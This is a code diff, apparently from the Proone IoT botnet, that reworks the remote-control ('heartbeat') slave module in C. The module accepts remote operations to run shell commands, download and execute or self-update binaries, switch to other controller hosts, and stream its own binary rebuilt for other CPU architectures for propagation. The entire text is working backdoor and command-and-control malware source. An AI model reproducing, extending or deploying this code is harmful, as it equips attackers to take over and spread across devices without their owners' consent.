-					prne_op_min(bin_meta.bin_size, ctx->iobuf[0].avail));
-				if (f_ret < 0) {
-					if (!prne_is_nberr(errno)) {
-						ctx->valid = false;
-						goto PROTO_ERR;
-					}
-				}
-				else if (f_ret == 0) {
-					goto PROTO_ERR;
-				}
 				else {
-					if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
-						prne_dbgpf(
-							HTBT_NT_SLV"@%"PRIuPTR": < bin dl %d bytes.\n",
-							(uintptr_t)ctx,
-							f_ret);
-					}
-					prne_iobuf_shift(ctx->iobuf + 0, f_ret);
-					bin_meta.bin_size -= f_ret;
+					goto END;
 				}
 			}
+			prne_iobuf_shift(ctx->iobuf + 0, -io_ret);
 		}
-
-		if (ctx->iobuf[0].len > 0) {
-			// This blocks!
-			f_ret = write(fd, ctx->iobuf[0].m, ctx->iobuf[0].len);
-			if (f_ret < 0) {
-				ret_status = PRNE_HTBT_STATUS_ERRNO;
-				ret_errno = errno;
-				ctx->skip += bin_meta.bin_size;
-				goto SND_STATUS;
-			}
-			prne_iobuf_shift(ctx->iobuf + 0, -f_ret);
-		}
-	}
+	} while (!stdio_f.fin);
 	close(fd);
 	fd = -1;
 
-	if (mh->op == PRNE_HTBT_OP_RUN_BIN) {
+	if (op == PRNE_HTBT_OP_RUN_BIN) {
 		char *add_args[1] = { path };
 
 		args = prne_htbt_parse_args(
@@ -1290,41 +1698,42 @@ static bool htbt_slv_srv_bin (
 			NULL,
 			SIZE_MAX);
 		if (args == NULL) {
-			goto END;
-		}
-
-		htbt_do_cmd(
-			bin_meta.cmd.detach,
-			args,
-			ctx,
-			mh->id,
-			&ret_status,
-			&ret_errno);
-	}
-	else {
-		if (!ctx->cbset->upbin(ctx->cb_ctx, path, &bin_meta.cmd)) {
 			ret_status = PRNE_HTBT_STATUS_ERRNO;
 			ret_errno = errno;
 			goto SND_STATUS;
 		}
-		path[0] = 0;
+
+		ret = htbt_do_cmd(
+			bin_meta.cmd.detach,
+			args,
+			ctx,
+			corr_id,
+			&ret_status,
+			&ret_errno);
+		if (!ret) {
+			goto END;
+		}
+	}
+	else {
+		ret = true;
+		if (ctx->cbset->upbin(ctx->cb_ctx, path, &bin_meta.cmd)) {
+			path[0] = 0;
+		}
+		else {
+			ret_status = PRNE_HTBT_STATUS_ERRNO;
+			ret_errno = errno;
+		}
 	}
 
-	goto SND_STATUS;
-PROTO_ERR:
-	htbt_slv_raise_protoerr(ctx, mh->id, 0);
-	goto END;
 SND_STATUS:
-	htbt_slv_fab_status(
-		ctx,
-		ret_status,
-		ret_errno,
-		mh->id,
-		NULL);
-	goto END;
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	if (!htbt_slv_send_status(ctx, &corr_id, ret_status, ret_errno, ev)) {
+		ret = false;
+	}
 END:
-	ctx->skip = bin_meta.bin_size;
+	prne_htbt_free_msg_head(&mh);
 	prne_htbt_free_bin_meta(&bin_meta);
+	prne_htbt_free_stdio(&stdio_f);
 	if (path != NULL && path[0] != 0) {
 		unlink(path);
 	}
@@ -1341,34 +1750,25 @@ END:
 
 static bool htbt_slv_srv_hover (
 	htbt_slv_ctx_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *mh)
+	const uint16_t corr_id)
 {
-	bool ret = true;
+	bool ret;
 	prne_htbt_hover_t hv;
-	prne_htbt_ser_rc_t s_ret;
-	size_t actual;
 	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_OK;
 	int32_t err = 0;
+	pth_event_t ev = NULL;
 
 	prne_htbt_init_hover(&hv);
 // TRY
-	s_ret = prne_htbt_dser_hover(
-		ctx->iobuf[0].m + off,
-		ctx->iobuf[0].len - off,
-		&actual,
-		&hv);
-	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-		ret = false;
-		goto END;
-	}
-	else {
-		off += actual;
-		prne_iobuf_shift(ctx->iobuf + 0, -off);
-	}
-	if (s_ret != PRNE_HTBT_SER_RC_OK) {
-		htbt_slv_raise_protoerr(ctx, mh->id, 0);
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	ret = htbt_slv_recv_frame(
+		ctx,
+		&hv,
+		(prne_htbt_dser_ft)prne_htbt_dser_hover,
+		&corr_id,
+		true,
+		ev);
+	if (!ret) {
 		goto END;
 	}
 
@@ -1379,17 +1779,10 @@ static bool htbt_slv_srv_hover (
 		ctx->hover_f(ctx->ioctx, &hv, &status, &err);
 	}
 
-	htbt_slv_fab_status(
-		ctx,
-		status,
-		err,
-		mh->id,
-		root_ev);
-	if (status == PRNE_HTBT_STATUS_OK) {
-		htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
-		ctx->valid = false;
-	}
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	ret = htbt_slv_send_status(ctx, &corr_id, status, err, ev);
 END:
+	pth_event_free(ev, FALSE);
 	prne_htbt_free_hover(&hv);
 	return ret;
 }
@@ -1425,19 +1818,10 @@ static void htbt_slv_set_pack_err (
 
 static bool htbt_slv_srv_rcb (
 	htbt_slv_ctx_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *org_mh)
+	const uint16_t corr_id)
 {
-	static const size_t RCB_IB_SIZE[] = {
-		PRNE_HTBT_STDIO_LEN_MAX,
-		512,
-		0
-	};
-	bool ret = true;
+	bool ret;
 	prne_htbt_rcb_t rcb_f;
-	prne_htbt_ser_rc_t s_ret;
-	size_t actual;
 	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_OK;
 	int32_t err = 0;
 	prne_pack_rc_t prc;
@@ -1456,21 +1840,15 @@ static bool htbt_slv_srv_rcb (
 	prne_init_bin_rcb_ctx(&rcb_ctx);
 	prne_init_iobuf(&rcb_ib);
 // TRY
-	s_ret = prne_htbt_dser_rcb(
-		ctx->iobuf[0].m + off,
-		ctx->iobuf[0].len - off,
-		&actual,
-		&rcb_f);
-	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-		ret = false;
-		goto END;
-	}
-	else {
-		off += actual;
-		prne_iobuf_shift(ctx->iobuf + 0, -off);
-	}
-	if (s_ret != PRNE_HTBT_SER_RC_OK) {
-		htbt_slv_raise_protoerr(ctx, org_mh->id, 0);
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	ret = htbt_slv_recv_frame(
+		ctx,
+		&rcb_f,
+		(prne_htbt_dser_ft)prne_htbt_dser_rcb,
+		&corr_id,
+		true,
+		ev);
+	if (!ret) {
 		goto END;
 	}
 
@@ -1479,7 +1857,7 @@ static bool htbt_slv_srv_rcb (
 		err = ENOMEDIUM;
 		goto STATUS_END;
 	}
-	if (!prne_try_alloc_iobuf(&rcb_ib, RCB_IB_SIZE)) {
+	if (!prne_try_alloc_iobuf(&rcb_ib, HTBT_STDIO_IB_SIZE)) {
 		status = PRNE_HTBT_STATUS_ERRNO;
 		err = errno;
 		goto STATUS_END;
@@ -1490,10 +1868,12 @@ static bool htbt_slv_srv_rcb (
 	}
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 		prne_dbgpf(
-			HTBT_NT_SLV"@%"PRIuPTR": starting rcb self=%02X target=%02X\n",
+			HTBT_NT_SLV"@%"PRIuPTR": starting rcb self=%02X target=%02X"
+			" compat(%s)\n",
 			(uintptr_t)ctx,
 			ctx->rcb->self,
-			rcb_f.arch);
+			rcb_f.arch,
+			rcb_f.compat ? "*" : " ");
 	}
 	prc = prne_start_bin_rcb_compat(
 		&rcb_ctx,
@@ -1518,15 +1898,11 @@ static bool htbt_slv_srv_rcb (
 		goto STATUS_END;
 	}
 
-	mh.id = org_mh->id;
+	mh.id = corr_id;
 	mh.is_rsp = true;
 	mh.op = PRNE_HTBT_OP_STDIO;
 	while (rcb_ib.len > 0 || prc != PRNE_PACK_RC_EOF) {
-		pth_event_free(ev, FALSE);
-		ev = pth_event(
-			PTH_EVENT_TIME,
-			prne_pth_tstimeout(HTBT_DL_TICK_TIMEOUT));
-		prne_assert(ev != NULL);
+		prne_pth_reset_timer(&ev, &HTBT_DL_TICK_TIMEOUT);
 
 		if (rcb_ib.avail > 0 && prc != PRNE_PACK_RC_EOF) {
 			io_ret = prne_bin_rcb_read(
@@ -1543,55 +1919,31 @@ static bool htbt_slv_srv_rcb (
 		}
 		if (rcb_ib.len > 0) {
 			data_f.len = rcb_ib.len;
-			htbt_slv_fab_frame(
-				ctx,
-				&mh,
-				&data_f,
-				(prne_htbt_ser_ft)prne_htbt_ser_stdio,
-				ev);
-			do {
-				io_ret = prne_op_min(ctx->iobuf[1].avail, rcb_ib.len);
-				memcpy(ctx->iobuf[1].m + ctx->iobuf[1].len, rcb_ib.m, io_ret);
-				prne_iobuf_shift(ctx->iobuf + 1, io_ret);
-				prne_iobuf_shift(&rcb_ib, -io_ret);
-
-				htbt_slv_consume_outbuf(ctx, 0, ev);
-				if (!ctx->valid) {
-					goto END;
-				}
-			} while (rcb_ib.len > 0);
+			ret =
+				htbt_slv_send_mh(ctx, &mh, ev) &&
+				htbt_slv_send_stdio(ctx, &data_f, ev) &&
+				htbt_slv_wflush_ib(ctx, &rcb_ib, ev);
+			if (!ret) {
+				goto END;
+			}
 		}
 
 		pth_yield(NULL);
 	}
-
-	pth_event_free(ev, FALSE);
-	ev = pth_event(
-		PTH_EVENT_TIME,
-		prne_pth_tstimeout(HTBT_DL_TICK_TIMEOUT));
-	prne_assert(ev != NULL);
-
+	prne_pth_reset_timer(&ev, &HTBT_DL_TICK_TIMEOUT);
 	data_f.fin = true;
 	data_f.len = 0;
-	htbt_slv_fab_frame(
-		ctx,
-		&mh,
-		&data_f,
-		(prne_htbt_ser_ft)prne_htbt_ser_stdio,
-		ev);
+	ret =
+		htbt_slv_send_mh(ctx, &mh, ev) &&
+		htbt_slv_send_stdio(ctx, &data_f, ev);
+	if (!ret) {
+		goto END;
+	}
 
 STATUS_END:
 	if (status != PRNE_HTBT_STATUS_OK) {
-		htbt_slv_fab_status(
-			ctx,
-			status,
-			err,
-			org_mh->id,
-			root_ev);
-		if (status == PRNE_HTBT_STATUS_OK) {
-			htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
-			ctx->valid = false;
-		}
+		prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+		ret = htbt_slv_send_status(ctx, &corr_id, status, err, ev);
 	}
 END:
 	prne_htbt_free_msg_head(&mh);
@@ -1603,259 +1955,92 @@ END:
 	return ret;
 }
 
-static void htbt_slv_skip_inbuf (htbt_slv_ctx_t *ctx) {
-	size_t consume;
+static bool htbt_slv_main (htbt_slv_ctx_t *ctx) {
+	prne_htbt_msg_head_t mh;
+	pth_event_t ev = NULL;
+	bool ret;
 
-	if (ctx->skip == 0) {
-		return;
+	prne_htbt_init_msg_head(&mh);
+
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	ret = htbt_slv_recv_mh(ctx, &mh, NULL, false, ev);
+	if (!ret) {
+		goto END;
 	}
-	consume = prne_op_min(ctx->iobuf[0].len, ctx->skip);
-
-	prne_iobuf_shift(
-		ctx->iobuf + 0,
-		-consume);
-	ctx->skip -= consume;
-}
-
-static bool htbt_slv_consume_inbuf (
-	htbt_slv_ctx_t *ctx,
-	pth_event_t root_ev)
-{
-	prne_htbt_ser_rc_t s_ret;
-	prne_htbt_msg_head_t f_head;
-	size_t actual;
-	bool ret = false;
-
-	while (ctx->valid) {
-		htbt_slv_skip_inbuf(ctx);
-
-		prne_htbt_free_msg_head(&f_head);
-		prne_htbt_init_msg_head(&f_head);
-
-		s_ret = prne_htbt_dser_msg_head(
-			ctx->iobuf[0].m,
-			ctx->iobuf[0].len,
-			&actual,
-			&f_head);
-		if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-			break;
-		}
-		if (s_ret != PRNE_HTBT_SER_RC_OK ||
-			f_head.is_rsp ||
-			(f_head.op != PRNE_HTBT_OP_NOOP && f_head.id == 0))
-		{
-			htbt_slv_raise_protoerr(ctx, f_head.id, 0);
-			goto END;
-		}
-
-		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
-#if PRNE_DEBUG
-			const char *opstr = prne_htbt_op_tostr(f_head.op);
-#endif
+	switch (mh.op) {
+	case PRNE_HTBT_OP_NOOP:
+		ret = htbt_slv_srv_noop(ctx);
+		break;
+	case PRNE_HTBT_OP_STDIO:
+		ret = htbt_slv_srv_stdio(ctx, mh.id);
+		break;
+	case PRNE_HTBT_OP_HOST_INFO:
+		htbt_slv_srv_hostinfo(ctx, mh.id);
+		ret = true;
+		break;
+	case PRNE_HTBT_OP_RUN_CMD:
+		ret = htbt_slv_srv_run_cmd(ctx, mh.id);
+		break;
+	case PRNE_HTBT_OP_RUN_BIN:
+	case PRNE_HTBT_OP_UP_BIN:
+		ret = htbt_slv_srv_bin(ctx, mh.id, mh.op);
+		break;
+	case PRNE_HTBT_OP_HOVER:
+		ret = htbt_slv_srv_hover(ctx, mh.id);
+		break;
+	case PRNE_HTBT_OP_RCB:
+		ret = htbt_slv_srv_rcb(ctx, mh.id);
+		break;
+	default:
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
 			prne_dbgpf(
-				HTBT_NT_SLV"@%"PRIuPTR": < %"PRIu16" %s(%d)\n",
+				HTBT_NT_SLV"@%"PRIuPTR": unimpl op %02X\n",
 				(uintptr_t)ctx,
-				f_head.id,
-				opstr != NULL ? opstr : "?",
-				f_head.op);
+				mh.op);
 		}
-		f_head.is_rsp = true;
-		switch (f_head.op) {
-		case PRNE_HTBT_OP_NOOP:
-			prne_iobuf_shift(ctx->iobuf + 0, -actual);
-			htbt_slv_fab_noop(ctx, true, root_ev);
-			break;
-		case PRNE_HTBT_OP_STDIO:
-			ret |= htbt_slv_srv_stdio(ctx, root_ev, actual, &f_head);
-			break;
-		case PRNE_HTBT_OP_HOST_INFO:
-			htbt_slv_srv_hostinfo(ctx, root_ev, actual, &f_head);
-			ret |= true;
-			break;
-		case PRNE_HTBT_OP_RUN_CMD:
-			ret |= htbt_slv_srv_run_cmd(ctx, root_ev, actual, &f_head);
-			break;
-		case PRNE_HTBT_OP_RUN_BIN:
-		case PRNE_HTBT_OP_UP_BIN:
-			ret |= htbt_slv_srv_bin(ctx, root_ev, actual, &f_head);
-			break;
-		case PRNE_HTBT_OP_HOVER:
-			ret |= htbt_slv_srv_hover(ctx, root_ev, actual, &f_head);
-			break;
-		case PRNE_HTBT_OP_RCB:
-			ret |= htbt_slv_srv_rcb(ctx, root_ev, actual, &f_head);
-			break;
-		default:
-			htbt_slv_raise_protoerr(ctx, f_head.id, PRNE_HTBT_STATUS_UNIMPL);
-			goto END;
-		}
-
-		if (!ret) {
-			break;
-		}
+		htbt_slv_send_status(ctx, &mh.id, PRNE_HTBT_STATUS_UNIMPL, 0, ev);
+		ret = false;
 	}
 
 END:
-	prne_htbt_free_msg_head(&f_head);
-
+	prne_htbt_free_msg_head(&mh);
 	return ret;
 }
 
 static void *htbt_slv_entry (void *p) {
 	htbt_slv_ctx_t *ctx = (htbt_slv_ctx_t*)p;
-	int f_ret;
-	pth_event_t ev_timeout, ev_root = NULL;
-	struct pollfd pfd[2];
+	pth_event_t ev = NULL;
+	bool valid = true;
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 		prne_dbgpf(HTBT_NT_SLV"@%"PRIuPTR": entry.\n", (uintptr_t)ctx);
 	}
 
-	ev_timeout = pth_event(
-		PTH_EVENT_TIME,
-		prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
-	prne_assert(ev_timeout != NULL);
-	if (!ctx->setup_f(ctx->ioctx, ev_timeout)) {
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	if (!ctx->setup_f(ctx->ioctx, ev)) {
 		goto END;
 	}
-	pth_event_free(ev_timeout, FALSE);
-	ev_timeout = NULL;
+	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
+	if (!htbt_slv_wflush_ib(ctx, ctx->iobuf + 1, ev)) {
+		goto END;
+	}
+	pth_event_free(ev, FALSE);
+	ev = NULL;
 
-	pfd[0].fd = ctx->fd[0];
-	pfd[1].fd = ctx->fd[1];
-	while (ctx->valid) {
-		pfd[0].revents = pfd[1].revents = 0;
-		if (ctx->pending_f(ctx->ioctx)) {
-			pfd[0].revents = POLLIN;
-		}
-		else {
-			if (ev_timeout == NULL) {
-				ev_timeout = pth_event(
-					PTH_EVENT_TIME,
-					prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
-				prne_assert(ev_timeout != NULL);
-			}
-
-			pth_event_free(ev_root, FALSE);
-			if (ctx->iobuf[1].len > 0) {
-				pfd[0].events = 0;
-				pfd[1].events = POLLOUT;
-				ev_root = pth_event(
-					PTH_EVENT_FD |
-						PTH_UNTIL_FD_WRITEABLE |
-						PTH_UNTIL_FD_EXCEPTION,
-					ctx->fd[1]);
-			}
-			else {
-				pfd[0].events = POLLIN;
-				pfd[1].events = 0;
-				ev_root = pth_event(
-					PTH_EVENT_FD |
-						PTH_UNTIL_FD_READABLE |
-						PTH_UNTIL_FD_EXCEPTION,
-					ctx->fd[0]);
-			}
-			prne_assert(ev_root != NULL);
-			pth_event_concat(ev_root, ev_timeout, NULL);
-
-			prne_dbgtrap(pth_mutex_acquire(ctx->cv.lock, FALSE, NULL));
-			pth_cond_await(ctx->cv.cond, ctx->cv.lock, ev_root);
-			pth_mutex_release(ctx->cv.lock);
-
-			f_ret = poll(pfd, 2, 0);
-			if (f_ret <= 0) {
-				break;
-			}
-		}
-
-		pth_event_free(ev_timeout, FALSE);
-		ev_timeout = pth_event(
-			PTH_EVENT_TIME,
-			prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
-		prne_assert(ev_timeout != NULL);
-
-		if (pfd[1].revents) {
-			htbt_slv_consume_outbuf(ctx, 0, ev_timeout);
-		}
-		if (pfd[0].revents) {
-			if (ctx->iobuf[0].avail == 0) {
-				prne_dbgpf("** Malicious client?\n");
-				ctx->valid = false;
-				goto END;
-			}
-			f_ret = ctx->read_f(
-				ctx->ioctx,
-				ctx->iobuf[0].m + ctx->iobuf[0].len,
-				ctx->iobuf[0].avail);
-			if (f_ret < 0 && prne_is_nberr(errno)) {
-				continue;
-			}
-			if (f_ret <= 0) {
-				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
-					if (f_ret == 0) {
-						prne_dbgpf(
-							HTBT_NT_SLV"@%"PRIuPTR": read EOF.\n",
-							(uintptr_t)ctx);
-					}
-					else {
-						prne_dbgpf(
-							HTBT_NT_SLV"@%"PRIuPTR": read error: "
-							"ret=%d, errno=%d\n",
-							(uintptr_t)ctx,
-							f_ret,
-							errno);
-					}
-				}
-				ctx->valid = false;
-				break;
-			}
-			if (PRNE_DEBUG) {
-				if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
-					prne_dbgpf(
-						HTBT_NT_SLV"@%"PRIuPTR": < %d bytes: ",
-						(uintptr_t)ctx,
-						f_ret);
-					for (int i = 0; i < f_ret; i += 1) {
-						prne_dbgpf(
-							"%02"PRIx8" ",
-							ctx->iobuf[0].m[ctx->iobuf[0].len + i]);
-					}
-					prne_dbgpf("\n");
-				}
-				else if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
-					prne_dbgpf(
-						HTBT_NT_SLV"@%"PRIuPTR": < %d bytes.\n",
-						(uintptr_t)ctx,
-						f_ret);
-				}
-			}
-			prne_iobuf_shift(ctx->iobuf + 0, f_ret);
-
-			if (htbt_slv_consume_inbuf(ctx, ev_timeout)) {
-				pth_event_free(ev_timeout, FALSE);
-				ev_timeout = NULL;
-			}
-		}
+	while (valid && ctx->loopchk_f(ctx->ioctx)) {
+		valid = htbt_slv_main(ctx);
 	}
 
 END:
-	pth_event_free(ev_timeout, FALSE);
-	ev_timeout = pth_event(
-		PTH_EVENT_TIME,
-		prne_pth_tstimeout(HTBT_CLOSE_TIMEOUT));
-	prne_assert(ev_timeout != NULL);
+	prne_pth_reset_timer(&ev, &HTBT_CLOSE_TIMEOUT);
+	ctx->cleanup_f(ctx->ioctx, ev);
 
-	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, ev_timeout);
-	ctx->cleanup_f(ctx->ioctx, ev_timeout);
-
-	pth_event_free(ev_root, FALSE);
-	pth_event_free(ev_timeout, FALSE);
+	pth_event_free(ev, FALSE);
 
 	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
 		prne_dbgpf(HTBT_NT_SLV"@%"PRIuPTR": exit.\n", (uintptr_t)ctx);
 	}
 
-	ctx->valid = false;
 	return NULL;
 }
 
